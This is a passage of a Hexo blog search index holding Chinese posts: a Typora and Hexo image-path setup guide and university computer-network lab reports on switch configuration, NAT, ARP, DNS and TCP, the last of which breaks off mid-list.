<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Typora与Hexo的图片根目录设置</title>
    <link href="/2022/12/30/Typora%E4%B8%8EHexo%E7%9A%84%E5%9B%BE%E7%89%87%E6%A0%B9%E7%9B%AE%E5%BD%95%E8%AE%BE%E7%BD%AE/"/>
    <url>/2022/12/30/Typora%E4%B8%8EHexo%E7%9A%84%E5%9B%BE%E7%89%87%E6%A0%B9%E7%9B%AE%E5%BD%95%E8%AE%BE%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>用了Hexo很长一段时间，一直使用<code>post_asset_folder: true</code>以及插件<code>hexo-asset-image</code>，但每次需要单独保存图片还是很麻烦，研究了很久，终于实现复制图片自动保存到对应文件夹且 不需要修改图片路径的方法。</p><p>参考资料：<a href="https://blog.csdn.net/m0_43401436/article/details/107191688">https://blog.csdn.net/m0_43401436/article/details/107191688</a></p><h3 id="设置步骤"><a href="#设置步骤" class="headerlink" title="设置步骤"></a>设置步骤</h3><h4 id="Typora偏好设置"><a href="#Typora偏好设置" class="headerlink" title="Typora偏好设置"></a>Typora偏好设置</h4><p><img src="/2022/12/30/Typora%E4%B8%8EHexo%E7%9A%84%E5%9B%BE%E7%89%87%E6%A0%B9%E7%9B%AE%E5%BD%95%E8%AE%BE%E7%BD%AE/image-20221230182231829.png" alt="image-20221230182231829"></p><p>这个设置会使复制到md文件中的图片自动保存至同一目录下的同名文件夹下，与Hexo内的<code>post_asset_folder</code>一致。</p><h4 id="post-asset-folder属性设置"><a href="#post-asset-folder属性设置" class="headerlink" title="post_asset_folder属性设置"></a>post_asset_folder属性设置</h4><p>将Hexo博客根目录内_config.yml文件内<code>post_asset_folder</code>设置为<code>true</code></p><p><img src="/2022/12/30/Typora%E4%B8%8EHexo%E7%9A%84%E5%9B%BE%E7%89%87%E6%A0%B9%E7%9B%AE%E5%BD%95%E8%AE%BE%E7%BD%AE/image-20221230182535710.png" alt="image-20221230182535710"></p><p>这一步的设置会在<code>hexo new “post”</code>时创建一个同名文件夹，复制到typora中的图片会自动以相对路径的形式保存在该文件夹内。</p><h4 id="插件下载"><a href="#插件下载" class="headerlink" title="插件下载"></a>插件下载</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">npm install https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/CodeFalling/</span>hexo-asset-image --save<br></code></pre></td></tr></table></figure><p>插件的作用在于<code>hexo generate</code>生成静态网页资源时自动由相对路径生成绝对路径，但要求md文件中必须使用相对路径，此时的md中复制的图片目录为<code>/同名文件夹/图片名</code>，多了个文件夹路径。</p><h4 id="图片文件根目录设置"><a href="#图片文件根目录设置" class="headerlink" title="图片文件根目录设置"></a>图片文件根目录设置</h4><p>打开<code>/blog/scaffolds/post.md</code>，该文件为每次hexo新建md文件时的格式，包括title、date等属性，在该属性中加入<code>typora-root-url: &#123;&#123; title &#125;&#125;</code>，使hexo新建的md文件自动以同路径下的同名文件夹为图片根目录。</p><p><img src="/2022/12/30/Typora%E4%B8%8EHexo%E7%9A%84%E5%9B%BE%E7%89%87%E6%A0%B9%E7%9B%AE%E5%BD%95%E8%AE%BE%E7%BD%AE/image-20221230205545625.png" alt="image-20221230205545625"></p><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>经过以上设置，在每次使用hexo生成新文章时，typora会自动将md文件的图片文件根目录设置为同名文件夹，此时复制到md文件内的图片会自动以相对路径<code>/图片名</code>的形式存储进同名文件夹内，此时使用hexo进行资源的整理、部署时，asset-image插件会自动根据文件路径生成静态页面，不需要对图片路径再度进行修改。</p>]]></content>
    
    
    <categories>
      
      <category>计算机网络-HDU</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络-交换机的基本配置</title>
    <link href="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BA%A4%E6%8D%A2%E6%9C%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/"/>
    <url>/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BA%A4%E6%8D%A2%E6%9C%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="交换机的基本配置"><a href="#交换机的基本配置" class="headerlink" title="交换机的基本配置"></a>交换机的基本配置</h1><h3 id="实验目的："><a href="#实验目的：" class="headerlink" title="实验目的："></a>实验目的：</h3><p>•掌握交换机命令行各种操作模式的区别；<br>•能够使用各种帮助信息；<br>•以及用命令进行基本的配置。</p><h3 id="实验环境说明："><a href="#实验环境说明：" class="headerlink" title="实验环境说明："></a>实验环境说明：</h3><p>Windows、eNSP、wireshark</p><h3 id="实验过程、步骤（可另附页、使用网络拓扑图等辅助说明）及结果："><a href="#实验过程、步骤（可另附页、使用网络拓扑图等辅助说明）及结果：" class="headerlink" title="实验过程、步骤（可另附页、使用网络拓扑图等辅助说明）及结果："></a>实验过程、步骤（可另附页、使用网络拓扑图等辅助说明）及结果：</h3><p>1、配置网络拓扑图</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BA%A4%E6%8D%A2%E6%9C%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/image-20221230180410932.png" alt="image-20221230180410932"></p><p>2、使用ping测试连通性。</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BA%A4%E6%8D%A2%E6%9C%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/image-20221230180415345.png" alt="image-20221230180415345"></p><p>3、学习交换机配置基础命令。<br>Ensp交换机含四种视图，分别为：<br><Huawei>用户视图：查看运行状态或其他参数<br>[Huawei] &#x2F;&#x2F;系统视图：配置设备的系统参数<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;1] &#x2F;&#x2F;接口视图：配置接口<br>[Huawei-ospf-1] &#x2F;&#x2F;协议视图：配置xx协议<br>4、学习使用交换机基本命令<br>①使用display version可以查看设备信息，含软件版本、设备型号、运行时间。</Huawei></p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BA%A4%E6%8D%A2%E6%9C%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/image-20221230180437957.png" alt="image-20221230180437957"></p><p>②使用display clock命令显示系统时间，使用clock datetime命令修改系统时间。</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BA%A4%E6%8D%A2%E6%9C%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/image-20221230180441524.png" alt="image-20221230180441524"></p><p>③使用display current-configuration可以查看配置信息</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BA%A4%E6%8D%A2%E6%9C%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/image-20221230180445963.png" alt="image-20221230180445963"></p><p>④使用save对交换机的修改进行保存</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BA%A4%E6%8D%A2%E6%9C%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/image-20221230180449877.png" alt="image-20221230180449877"></p><p>⑤使用reset saved-configuration命令可以使交换机恢复出厂设置。</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BA%A4%E6%8D%A2%E6%9C%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/image-20221230180453051.png" alt="image-20221230180453051"></p><p>5、尝试配置接口的双工模式（自协商或者非自协商模式下进行）<br>自协商：接口的双工模式是和对端接口协商得到的。但有时候需要全双工，但是自协商状态下协商的是半双工，这时我们执行auto duplex full命令使接口的可协商双工模式变为全双工模式。<br>①关闭S1 S2 S3的自动协商功能，手动指定为全双工。</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BA%A4%E6%8D%A2%E6%9C%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/image-20221230180457437.png" alt="image-20221230180457437"></p><p>S2与S3的命令一致。<br>②设置速率，速率是和对端接口协商得到的，速率不同的话，无法正常通信。</p><p>设置GE接口速率100Mbit&#x2F;s，配置Ethernet接口速率为10Mbit&#x2F;，其他几个端口也是类似设置。</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BA%A4%E6%8D%A2%E6%9C%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/image-20221230180506157.png" alt="image-20221230180506157"></p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BA%A4%E6%8D%A2%E6%9C%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/image-20221230180510013.png" alt="image-20221230180510013"></p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BA%A4%E6%8D%A2%E6%9C%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/image-20221230180513294.png" alt="image-20221230180513294"></p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BA%A4%E6%8D%A2%E6%9C%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/image-20221230180516293.png" alt="image-20221230180516293"></p>]]></content>
    
    
    <categories>
      
      <category>计算机网络-HDU</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络-配置动态/静态NAT</title>
    <link href="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E9%85%8D%E7%BD%AE%E5%8A%A8%E6%80%81-%E9%9D%99%E6%80%81NAT/"/>
    <url>/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E9%85%8D%E7%BD%AE%E5%8A%A8%E6%80%81-%E9%9D%99%E6%80%81NAT/</url>
    
    <content type="html"><![CDATA[<h1 id="配置静态-动态-NAT"><a href="#配置静态-动态-NAT" class="headerlink" title="配置静态\动态 NAT"></a>配置静态\动态 NAT</h1><h3 id="实验目的："><a href="#实验目的：" class="headerlink" title="实验目的："></a>实验目的：</h3><p>•配置网络地址变换；<br>•提供到公司共享服务器的可靠外部访问。</p><h3 id="实验环境说明："><a href="#实验环境说明：" class="headerlink" title="实验环境说明："></a>实验环境说明：</h3><p>Windows、eNSP、wireshark</p><h3 id="实验过程、步骤（可另附页、使用网络拓扑图等辅助说明）及结果："><a href="#实验过程、步骤（可另附页、使用网络拓扑图等辅助说明）及结果：" class="headerlink" title="实验过程、步骤（可另附页、使用网络拓扑图等辅助说明）及结果："></a>实验过程、步骤（可另附页、使用网络拓扑图等辅助说明）及结果：</h3><p>1、了解NAT原理。<br>早在20世纪90年代初，有关RFC文档就提出了 IP地址耗尽的可能性。IPv6技术的提出虽然可以从根本上解决地址短缺的问题，但是也无法立刻替换现有成熟且广泛应用的IPv4网络。既然不能立即过渡到IPv6网络,那么必须使用一些技术手段来延长IPv4的寿命，其中广泛使用的技术之一就是网络地址转换（Network Address Translation, NAT） 。NAT是将IP数据报文报头中的IP地址转换为另一个IP地址的过程，主要用于实现内部网络（私有IP地址）访问外部网络（公有IP地址）的功能。<br>2、建立网络拓扑</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E9%85%8D%E7%BD%AE%E5%8A%A8%E6%80%81-%E9%9D%99%E6%80%81NAT/image-20221230175748378.png" alt="image-20221230175748378"></p><p>3、在网关路由器R1上配置访问外网的默认路由，一开始输入命令时出错，后来发现是没有开启系统视图。</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E9%85%8D%E7%BD%AE%E5%8A%A8%E6%80%81-%E9%9D%99%E6%80%81NAT/image-20221230175753448.png" alt="image-20221230175753448"></p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E9%85%8D%E7%BD%AE%E5%8A%A8%E6%80%81-%E9%9D%99%E6%80%81NAT/image-20221230175757904.png" alt="image-20221230175757904"></p><p>4、配置路由ip地址.<br>R1:g0&#x2F;0&#x2F;0的ip地址为1.1.1.1&#x2F;24，g0&#x2F;0&#x2F;0的ip地址为192.168.1.254.</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E9%85%8D%E7%BD%AE%E5%8A%A8%E6%80%81-%E9%9D%99%E6%80%81NAT/image-20221230175802992.png" alt="image-20221230175802992"></p><p>R2：g0&#x2F;0&#x2F;0的ip地址为1.1.1.2&#x2F;24.</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E9%85%8D%E7%BD%AE%E5%8A%A8%E6%80%81-%E9%9D%99%E6%80%81NAT/image-20221230175806828.png" alt="image-20221230175806828"></p><p>5、由于内网使用的都是私有IP地址，无法直接访问公网。现需在网关路由器R1上配置NAT地址转换，将私网地址转换为公网地址。配置静态NAT，将192.168.1.1转换为1.1.1.10：</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E9%85%8D%E7%BD%AE%E5%8A%A8%E6%80%81-%E9%9D%99%E6%80%81NAT/image-20221230175810689.png" alt="image-20221230175810689"></p><p>6、使用ping测试与外网的连接，两个路由均可连接：</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E9%85%8D%E7%BD%AE%E5%8A%A8%E6%80%81-%E9%9D%99%E6%80%81NAT/image-20221230175814814.png" alt="image-20221230175814814"></p><p>7、抓包可以看见地址192.168.1.1已经转换为1.1.1.10</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E9%85%8D%E7%BD%AE%E5%8A%A8%E6%80%81-%E9%9D%99%E6%80%81NAT/image-20221230175820015.png" alt="image-20221230175820015"></p><p>8、配置动态NAT，NAT池为1.1.1.5-1.1.1.9，创建acl规则，应用到NAT上。</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E9%85%8D%E7%BD%AE%E5%8A%A8%E6%80%81-%E9%9D%99%E6%80%81NAT/image-20221230175826354.png" alt="image-20221230175826354"></p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E9%85%8D%E7%BD%AE%E5%8A%A8%E6%80%81-%E9%9D%99%E6%80%81NAT/image-20221230175830114.png" alt="image-20221230175830114"></p><p>9、使用PC2ping路由器，可以接通：</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E9%85%8D%E7%BD%AE%E5%8A%A8%E6%80%81-%E9%9D%99%E6%80%81NAT/image-20221230175833230.png" alt="image-20221230175833230"></p><p>10、对R2进行抓包，发现1.1.1.5-1.1.1.9的ip会被循环使用。</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E9%85%8D%E7%BD%AE%E5%8A%A8%E6%80%81-%E9%9D%99%E6%80%81NAT/image-20221230175837811.png" alt="image-20221230175837811"></p>]]></content>
    
    
    <categories>
      
      <category>计算机网络-HDU</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络-了解Ethernet和ARP协议</title>
    <link href="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BA%86%E8%A7%A3Ethernet-%E5%92%8C-ARP-%E5%8D%8F%E8%AE%AE/"/>
    <url>/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BA%86%E8%A7%A3Ethernet-%E5%92%8C-ARP-%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="Ethernet-和-ARP-协议的研究"><a href="#Ethernet-和-ARP-协议的研究" class="headerlink" title="Ethernet 和 ARP 协议的研究"></a>Ethernet 和 ARP 协议的研究</h1><h3 id="实验目的：（需要在涉及关键步骤的截图上有明显的能体现自己信息的标记）"><a href="#实验目的：（需要在涉及关键步骤的截图上有明显的能体现自己信息的标记）" class="headerlink" title="实验目的：（需要在涉及关键步骤的截图上有明显的能体现自己信息的标记）"></a>实验目的：（需要在涉及关键步骤的截图上有明显的能体现自己信息的标记）</h3><p>1.了解以太网协议<br>2.了解 ARP 协议<br>3.了解计算机 OSI 7 层的链路层</p><h3 id="实验环境说明："><a href="#实验环境说明：" class="headerlink" title="实验环境说明："></a>实验环境说明：</h3><p>Windows、wireshark</p><h3 id="实验过程、步骤（可另附页、使用网络拓扑图等辅助说明）及结果："><a href="#实验过程、步骤（可另附页、使用网络拓扑图等辅助说明）及结果：" class="headerlink" title="实验过程、步骤（可另附页、使用网络拓扑图等辅助说明）及结果："></a>实验过程、步骤（可另附页、使用网络拓扑图等辅助说明）及结果：</h3><p>ARP（Address Resolution Protocol，地址解析协议）是用来将IP地址解析为MAC地址的协议。主机或三层网络设备上会维护一张ARP表，用于存储IP地址和MAC地址的映射关系，一般ARP表项包括动态ARP表项和静态ARP表项。<br>1、启动 Wireshark 并用 Chrome 访问其他网站，保存实验结果，使用cmd显示arp缓存。</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BA%86%E8%A7%A3Ethernet-%E5%92%8C-ARP-%E5%8D%8F%E8%AE%AE/image-20221230175314069.png" alt="image-20221230175314069"></p><p>2、打开wireshark分析arp协议，源MAC地址为14:f6:d8:b6:8d:84，ip地址为192.168.31.207,目的MAC地址9c:9d:7e:c3:4f:a8 ，该ip地址为192.168.31.1，为本机的默认网关路由地址。硬件地址长度为6（以太网），协议地址长度为4（IPv4）。</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BA%86%E8%A7%A3Ethernet-%E5%92%8C-ARP-%E5%8D%8F%E8%AE%AE/image-20221230175322654.png" alt="image-20221230175322654">3、双字节帧类型字段值为0x0806，为ARP协议。</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BA%86%E8%A7%A3Ethernet-%E5%92%8C-ARP-%E5%8D%8F%E8%AE%AE/image-20221230175327984.png" alt="image-20221230175327984"></p><p>4、分析ARP缓存的列值含义</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BA%86%E8%A7%A3Ethernet-%E5%92%8C-ARP-%E5%8D%8F%E8%AE%AE/image-20221230175333971.png" alt="image-20221230175333971"></p><p>5、分析ARP请求，从以太网帧开始到ARP操作码字段共21字节，操作码为1，意思是ARP请求</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BA%86%E8%A7%A3Ethernet-%E5%92%8C-ARP-%E5%8D%8F%E8%AE%AE/image-20221230175343184.png" alt="image-20221230175343184"></p><p>6、分析ARP响应，操作码为2，意思是ARP回显。目标地址与源地址就与请求报文相反。</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BA%86%E8%A7%A3Ethernet-%E5%92%8C-ARP-%E5%8D%8F%E8%AE%AE/image-20221230175349363.png" alt="image-20221230175349363"></p>]]></content>
    
    
    <categories>
      
      <category>计算机网络-HDU</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络-了解DNS原理</title>
    <link href="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BA%86%E8%A7%A3DNS%E5%8E%9F%E7%90%86/"/>
    <url>/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BA%86%E8%A7%A3DNS%E5%8E%9F%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="DNS的研究"><a href="#DNS的研究" class="headerlink" title="DNS的研究"></a>DNS的研究</h1><h3 id="实验目的："><a href="#实验目的：" class="headerlink" title="实验目的："></a>实验目的：</h3><p>•快速简单了解DNS<br>•了解系统命令NSLOOKUP和IPCONFIG的用法</p><h3 id="实验环境说明："><a href="#实验环境说明：" class="headerlink" title="实验环境说明："></a>实验环境说明：</h3><p>Windows、ubuntu20.04</p><h3 id="实验过程、步骤（可另附页、使用网络拓扑图等辅助说明）及结果："><a href="#实验过程、步骤（可另附页、使用网络拓扑图等辅助说明）及结果：" class="headerlink" title="实验过程、步骤（可另附页、使用网络拓扑图等辅助说明）及结果："></a>实验过程、步骤（可另附页、使用网络拓扑图等辅助说明）及结果：</h3><p>一、学习DNS原理<br>1、查询域名IP的过程，首先是查询命令参数和统计，然后是查询内容，显示DNS响应内容，得到该域名的四个ip地址，以及本机的DNS服务器为127.0.0.53:53。</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BA%86%E8%A7%A3DNS%E5%8E%9F%E7%90%86/image-20221230174749373.png" alt="image-20221230174749373"></p><p>2、使用4.2.2.2服务器查询ip地址</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BA%86%E8%A7%A3DNS%E5%8E%9F%E7%90%86/image-20221230174757227.png" alt="image-20221230174757227"></p><p>可知域名的层级结构为主机名.次级域名.顶级域名.根域名，其中该域名最后的.就是根域名。</p><p>3、显示分级查询过程</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BA%86%E8%A7%A3DNS%E5%8E%9F%E7%90%86/image-20221230174802119.png" alt="image-20221230174802119"></p><p>第一段是根域名所有NS记录，然后是分级查询域名的NS记录，最后获得ip地址为192.112.36.4<br>4、用dig可查看每一级域名的NS记录，使用+short简化</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BA%86%E8%A7%A3DNS%E5%8E%9F%E7%90%86/image-20221230174810029.png" alt="image-20221230174810029"></p><p>二、了解系统命令NSLOOKUP和IPCONFIG的用法<br>1、清除windows的DNS缓存</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BA%86%E8%A7%A3DNS%E5%8E%9F%E7%90%86/image-20221230174815485.png" alt="image-20221230174815485"></p><p>2、使用nslookup查询<a href="http://www.tsinghua.edu.cn/">www.tsinghua.edu.cn</a></p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BA%86%E8%A7%A3DNS%E5%8E%9F%E7%90%86/image-20221230174819121.png" alt="image-20221230174819121"></p><p>得到清华网站ip的非权威应答。该ip为IPv6。<br>3、添加-type&#x3D;NS选项查询权威DNS。</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BA%86%E8%A7%A3DNS%E5%8E%9F%E7%90%86/image-20221230174827560.png" alt="image-20221230174827560"></p><p>4、直接查询权威DNS，即直接查询最终的DNS服务器。</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BA%86%E8%A7%A3DNS%E5%8E%9F%E7%90%86/image-20221230174832741.png" alt="image-20221230174832741"></p><p>5、尝试查询牛津大学的权威DNS服务器</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BA%86%E8%A7%A3DNS%E5%8E%9F%E7%90%86/image-20221230174837202.png" alt="image-20221230174837202"></p><p>6、使用这几个DNS服务器查询yahoo域名，有的成功，有的不成功，说明不同域名的权威服务器不一定相同。</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BA%86%E8%A7%A3DNS%E5%8E%9F%E7%90%86/image-20221230174842805.png" alt="image-20221230174842805"></p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BA%86%E8%A7%A3DNS%E5%8E%9F%E7%90%86/image-20221230174848395.png" alt="image-20221230174848395"></p><p>7、用wireshark抓包dns请求，可以看见使用的是UDP协议，本机的DNS服务器地址为192.168.31.207，且查询消息的目标端口和响应消息的源端口均为53。</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BA%86%E8%A7%A3DNS%E5%8E%9F%E7%90%86/image-20221230174855194.png" alt="image-20221230174855194"></p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BA%86%E8%A7%A3DNS%E5%8E%9F%E7%90%86/image-20221230174859690.png" alt="image-20221230174859690"></p><p>8、DNS查询消息不包括任何结果，Type&#x3D;A，Answer RRs&#x3D;0.</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BA%86%E8%A7%A3DNS%E5%8E%9F%E7%90%86/image-20221230174905484.png" alt="image-20221230174905484"></p><p>9、DNS响应信息包含三条，是规范CNAME的加速地址及两个IPv4地址。</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BA%86%E8%A7%A3DNS%E5%8E%9F%E7%90%86/image-20221230174910083.png" alt="image-20221230174910083"></p><p>10、查看后续TCP包，ip地址均为DNS响应的36.152.44.95，DNS获取一次后有本地缓存，因此不会在每次请求资源时都访问DNS服务器。</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BA%86%E8%A7%A3DNS%E5%8E%9F%E7%90%86/image-20221230174914361.png" alt="image-20221230174914361"></p>]]></content>
    
    
    <categories>
      
      <category>计算机网络-HDU</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络-TCP协议分析</title>
    <link href="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-TCP%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"/>
    <url>/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-TCP%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="TCP协议分析"><a href="#TCP协议分析" class="headerlink" title="TCP协议分析"></a>TCP协议分析</h1><h3 id="实验目的："><a href="#实验目的：" class="headerlink" title="实验目的："></a>实验目的：</h3><p>•了解TCP报文段的结构；<br>    •掌握TCP数据流追踪的方法；<br>    •理解TCP三次握手的基本过程；<br>    •理解TCP连接终止的基本过程；<br>    •认识TCP重置；<br>•理解TCP可靠数据传输的基本原理。</p><h3 id="实验环境说明："><a href="#实验环境说明：" class="headerlink" title="实验环境说明："></a>实验环境说明：</h3><p>Windows、wireshark</p><h3 id="实验过程、步骤（可另附页、使用网络拓扑图等辅助说明）及结果："><a href="#实验过程、步骤（可另附页、使用网络拓扑图等辅助说明）及结果：" class="headerlink" title="实验过程、步骤（可另附页、使用网络拓扑图等辅助说明）及结果："></a>实验过程、步骤（可另附页、使用网络拓扑图等辅助说明）及结果：</h3><p>1、学习TCP报文结构</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-TCP%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/image-20221230174212149.png" alt="image-20221230174212149"></p><p>TCP报文有首部和数据部分组成，首部的大小为20～60字节，长度可变，而数据部分是可选的，即TCP报文中可以不包括数据。<br>下面分析每个字段的作用：<br>（1）源端口号（source port）: 该端口号为16位，并且与源IP地址一起标识发送该TCP报文段的通信进程。<br>（2）目的端口号（destination port）: 